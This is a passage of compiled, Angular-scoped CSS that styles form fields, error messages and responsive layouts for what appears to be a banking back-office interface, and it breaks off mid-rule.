        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select.xxxsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-textarea.xxxsmall[_ngcontent-c22] {
            width: 42px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input.xxsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-select.xxsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-textarea.xxsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-input.xxsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select.xxsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-textarea.xxsmall[_ngcontent-c22] {
            width: 100px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input.xsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-select.xsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-textarea.xsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-input.xsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select.xsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-textarea.xsmall[_ngcontent-c22] {
            width: 128px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input.small[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-select.small[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-textarea.small[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-input.small[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select.small[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-textarea.small[_ngcontent-c22] {
            width: 168px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input.medium[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-select.medium[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-textarea.medium[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-input.medium[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select.medium[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-textarea.medium[_ngcontent-c22] {
            width: 296px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input.large[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-select.large[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-textarea.large[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-input.large[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select.large[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-textarea.large[_ngcontent-c22] {
            width: 350px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22] {
            width: 215px;
            margin: 4px 0;
            padding: 0;
            line-height: 11px;
            font-size: 12px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-box-error.xxxsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-box-error.xxxsmall[_ngcontent-c22] {
            width: 42px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-box-error.xxsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-box-error.xxsmall[_ngcontent-c22] {
            width: 100px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-box-error.xsmall[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-box-error.xsmall[_ngcontent-c22] {
            width: 128px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-box-error.small[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-box-error.small[_ngcontent-c22] {
            width: 168px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-box-error.medium[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-box-error.medium[_ngcontent-c22] {
            width: 296px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-box-error.large[_ngcontent-c22],
        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-box-error.large[_ngcontent-c22] {
            width: 350px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22]:after {
            top: 10px
        }

        .venecia-main-box.cardLayoutMode[_ngcontent-c22] {
            padding: 0 0 6px !important
        }

        .venecia-main-box.cardLayoutMode[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            padding: 0
        }

        .venecia-main-box.cardLayoutMode[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22] {
            max-width: none;
            padding: 3px 0 0
        }

        @media only screen and (max-width:1023px) and (min-width:320px) {
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c22] {
                width: 100%;
                padding: 0 0 6px !important
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
                display: block;
                width: 100%
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22] {
                display: block;
                width: 100%;
                max-width: none;
                padding: 0 0 6px
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
                display: block;
                width: 100%
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] {
                display: block;
                width: 100%;
                padding: 0 0 6px
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22] {
                display: block;
                width: 100%
            }

            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22],
            .break-1024.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22] {
                width: 100%;
                padding: 0 4px
            }

            .break-1024.venecia-main-box.cardLayoutMode[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22] {
                padding: 3px 0 0
            }
        }

        @media only screen and (max-width:767px) and (min-width:320px) {
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c22] {
                width: 100%;
                padding: 0 0 6px !important
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
                display: block;
                width: 100%
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22] {
                display: block;
                width: 100%;
                max-width: none;
                padding: 0 0 6px
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
                display: block;
                width: 100%
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] {
                display: block;
                width: 100%;
                padding: 0 0 6px
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22] {
                display: block;
                width: 100%
            }

            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22],
            .break-768.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22] {
                width: 100%;
                padding: 0 4px
            }

            .break-768.venecia-main-box.cardLayoutMode[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22] {
                padding: 3px 0 0
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c22],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c22] {
                width: 100%;
                padding: 0 0 6px !important
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
                display: block;
                width: 100%
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22] {
                display: block;
                width: 100%;
                max-width: none;
                padding: 0 0 6px
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
                display: block;
                width: 100%
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] {
                display: block;
                width: 100%;
                padding: 0 0 6px
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22] {
                display: block;
                width: 100%
            }

            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22],
            .break-0.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22],
            .break-640.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22] {
                width: 100%;
                padding: 0 4px
            }

            .break-0.venecia-main-box.cardLayoutMode[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22],
            .break-640.venecia-main-box.cardLayoutMode[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22] {
                padding: 3px 0 0
            }
        }

        @media only screen and (max-width:479px) and (min-width:320px) {
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c22] {
                width: 100%;
                padding: 0 0 6px !important
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
                display: block;
                width: 100%
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22] {
                display: block;
                width: 100%;
                max-width: none;
                padding: 0 0 6px
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
                display: block;
                width: 100%
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] {
                display: block;
                width: 100%;
                padding: 0 0 6px
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22] {
                display: block;
                width: 100%
            }

            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22],
            .break-480.venecia-main-box.formLayoutMode[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22] {
                width: 100%;
                padding: 0 4px
            }

            .break-480.venecia-main-box.cardLayoutMode[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22] {
                padding: 3px 0 0
            }
        }

        .backoffice [_nghost-c22] .dynamicRequest.venecia-main-box[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22],
        .backoffice [_nghost-c22] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            width: 200px
        }

        .backoffice [_nghost-c22] .dynamicRequest.venecia-main-box[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
        .backoffice [_nghost-c22] .dynamicRequest.venecia-main-box[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
        .backoffice [_nghost-c22] .dynamicRequest.venecia-main-box[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22],
        .backoffice [_nghost-c22] .dynamicRequest.venecia-main-box[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
        .backoffice [_nghost-c22] .dynamicRequest.venecia-main-box[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
        .backoffice [_nghost-c22] .dynamicRequest.venecia-main-box[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22],
        .backoffice [_nghost-c22] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
        .backoffice [_nghost-c22] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
        .backoffice [_nghost-c22] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22],
        .backoffice [_nghost-c22] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22],
        .backoffice [_nghost-c22] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-select[_ngcontent-c22],
        .backoffice [_nghost-c22] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c22] .venecia-main-form-drop[_ngcontent-c22] .venecia-main-form-textarea[_ngcontent-c22] {
            width: 275px
        }

        .backoffice [_nghost-c22] .dynamicRequest.venecia-main-box[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22],
        .backoffice [_nghost-c22] .requestDefinitionDisplayMode.venecia-main-box[_ngcontent-c22] .venecia-main-form-label-data[_ngcontent-c22] {
            padding: 0 0 6px;
            line-height: 30px;
            width: 60%
        }

        .backoffice [_nghost-c22] .requestDefinitionDisplayMode[_ngcontent-c22] label[_ngcontent-c22] .toggle_title[_ngcontent-c22] {
            font-size: 12px;
            color: #666
        }

        .backoffice [_nghost-c22] .requestDefinitionDisplayMode[_ngcontent-c22] label[_ngcontent-c22] .toggle-control[_ngcontent-c22] {
            margin-top: -21px;
            height: 22px;
            margin-left: 150px;
            background-color: #fff;
            border: 1px solid #c5c5c5;
            width: 3.2em
        }

        .backoffice [_nghost-c22] .requestDefinitionDisplayMode[_ngcontent-c22] label[_ngcontent-c22] .toggle-control[_ngcontent-c22]::after {
            background-color: #c5c5c5;
            margin-top: -1px
        }

        .backoffice [_nghost-c22] .requestDefinitionDisplayMode[_ngcontent-c22] label[_ngcontent-c22] .title[_ngcontent-c22] {
            margin-left: 200px;
            margin-top: -37px
        }

        .backoffice [_nghost-c22] .requestDefinitionDisplayMode[_ngcontent-c22] label[_ngcontent-c22] .noTitle[_ngcontent-c22] {
            margin-left: 200px
        }

        .backoffice [_nghost-c22] .requestDefinitionDisplayMode[_ngcontent-c22] label[_ngcontent-c22] input[_ngcontent-c22]:checked+.toggle-control[_ngcontent-c22] {
            border-color: #c5c5c5;
            background-color: #fff
        }

        .backoffice [_nghost-c22] .requestDefinitionDisplayMode[_ngcontent-c22] label[_ngcontent-c22] input[_ngcontent-c22]:checked+.toggle-control[_ngcontent-c22]:after {
            background-color: #ff4800
        }

        .backoffice [_nghost-c22] .recordGeneratorMode[_ngcontent-c22] .istanbul_form-container_input[_ngcontent-c22] {
            min-width: 40px !important;
            padding: 4px 8px 3px 4px !important
        }

        input[type=number][_ngcontent-c22]::-webkit-inner-spin-button,
        input[type=number][_ngcontent-c22]::-webkit-outer-spin-button {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            margin: 0
        }

        .venecia-main-form-content[_ngcontent-c22] {
            margin-bottom: 4px
        }

        .venecia-main-form-content.venecia-position[_ngcontent-c22] {
            position: relative
        }

        .venecia-main-form-content.venecia-position[_ngcontent-c22] .venecia-main_loader_content[_ngcontent-c22] {
            position: absolute;
            right: 5px;
            top: 3px
        }

        .venecia-main-box[_ngcontent-c22] {
            padding: 0 0 8px
        }

        .venecia-main-box[_ngcontent-c22] .venecia-main-form-input.short[_ngcontent-c22] {
            width: 100px
        }

        .venecia-main-box[_ngcontent-c22] .venecia-main-form-input.xxxsmall[_ngcontent-c22] {
            width: 42px
        }

        .venecia-main-box[_ngcontent-c22] .venecia-main-form-input.medium-notifications[_ngcontent-c22] {
            width: 140px
        }

        .venecia-main-box.splitRowDescriptionMode[_ngcontent-c22] {
            padding-bottom: 0
        }

        .venecia-main-box.splitRowDescriptionMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
            display: none
        }

        .venecia-main-box.splitRowAmountMode[_ngcontent-c22] {
            padding-bottom: 0
        }

        .venecia-main-box.splitRowAmountMode[_ngcontent-c22] .venecia-main-form-content.venecia-position[_ngcontent-c22] {
            width: auto;
            display: inline-block
        }

        .venecia-main-box.budgetOneTimeRowAmountMode[_ngcontent-c22] {
            padding-bottom: 1px
        }

        .venecia-main-box.budgetOneTimeRowAmountMode[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            width: auto
        }

        .venecia-main-box.budgetOneTimeRowAmountMode[_ngcontent-c22] .venecia-main-form-content.venecia-position[_ngcontent-c22] {
            width: auto;
            display: inline-block
        }

        .venecia-main-box.withoutMargins[_ngcontent-c22] {
            padding: 0
        }

        .venecia-main-box.withoutMargins[_ngcontent-c22] .venecia-main-box-error[_ngcontent-c22],
        .venecia-main-box.withoutMargins[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
            display: none
        }

        .venecia-main-box.withoutMargins[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22] {
            margin: 0
        }

        .venecia-main-box.cleanNumerFieldMode[_ngcontent-c22] {
            padding: 0
        }

        .venecia-main-box.cleanNumerFieldMode[_ngcontent-c22] .venecia-main-form-label-parent[_ngcontent-c22] {
            display: none
        }

        .venecia-main-box.fullHorizontalMode[_ngcontent-c22] .venecia-main-form-label[_ngcontent-c22] {
            width: 200px
        }

        .venecia-main-box.fullHorizontalMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] input[_ngcontent-c22] {
            margin-right: 14px
        }

        .venecia-main-box.savingGoalMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22] {
            border-width: 0 0 1px;
            text-align: right;
            font-size: 14px
        }

        .venecia-main-box.savingGoalMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input.required[_ngcontent-c22] {
            border-left: 0
        }

        .venecia-main-box.savingGoalMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22]:focus {
            background: #fff;
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .venecia-main-box.savingGoalMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input.valid[_ngcontent-c22] {
            border-left: 0 !important
        }

        .venecia-main-box.savingGoalMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input.valid[_ngcontent-c22]:focus {
            border-left: 0 !important;
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .venecia-main-box.amountSelectorMode[_ngcontent-c22] .broome-field.broome-field-has-text[_ngcontent-c22] {
            padding-right: 0
        }

        .venecia-main-box.transactionMultipleMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] {
            display: block
        }

        .venecia-main-box.transactionMultipleMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input.medium[_ngcontent-c22] {
            width: 296px
        }

        .venecia-main-box.siparia-input-input-formMode[_ngcontent-c22] {
            display: inline-block;
            vertical-align: top;
            margin-top: -10px
        }

        .venecia-main-box.siparia-input-input-formMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] {
            margin-bottom: 0
        }

        .venecia-main-box.siparia-input-input-formMode[_ngcontent-c22] .venecia-main-form-content[_ngcontent-c22] .venecia-main-form-input[_ngcontent-c22] {
            border-top: 0;
            border-left: 0;
            border-right: 0;
            border-bottom: 1px solid #bbb
        }

        .venecia-main-box.toggleEnabledDisabledSMSMode.formLayoutMode[_ngcontent-c22] {
            padding-top: 14px !important;
            padding-bottom: 0 !important
        }

        .venecia-main-box-error[_ngcontent-c22] {
            color: #eb3236;
            font-weight: 500;
            display: block;
            padding: 0;
            font-size: 12px;
            line-height: 10px;
            margin-top: 4px;
            margin-bottom: 4px
        }

        .roma_basic_content_row[_ngcontent-c22] {
            min-height: 38px;
            padding: 0 12px 12px
        }

        .roma_basic_content_row.personalSettingsMode[_ngcontent-c22] .roma_basic_content_row_data[_ngcontent-c22] {
            word-break: break-all
        }

        .roma_basic_content_row_label[_ngcontent-c22] {
            display: block;
            color: #8a8a8a;
            font-size: 11px;
            font-family: dinMedium
        }

        .roma_basic_content_row_data[_ngcontent-c22] {
            display: block;
            color: #333;
            font-size: 14px;
            padding-top: 0
        }

        .roma_basic_content_row[_ngcontent-c22] .roma_basic_content_row_data[_ngcontent-c22] {
            line-height: 1.1;
            padding-top: 2px
        }

        .roma-field[_ngcontent-c22] {
            width: 68%;
            padding: 5px 1%;
            color: #666;
            background-color: transparent;
            border: 0;
            margin-top: 0;
            text-align: right;
            font-size: 14px
        }

        .roma-field[_ngcontent-c22]:focus {
            outline: 0
        }

        .roma-form-input[_ngcontent-c22] {
            display: block
        }

        .roma-form-label[_ngcontent-c22] {
            padding-left: 8px;
            padding-bottom: 5px
        }

        .roma-main-form-label-data[_ngcontent-c22] {
            display: inline-block;
            font-size: 14px;
            color: #333;
            overflow: hidden;
            text-overflow: ellipsis;
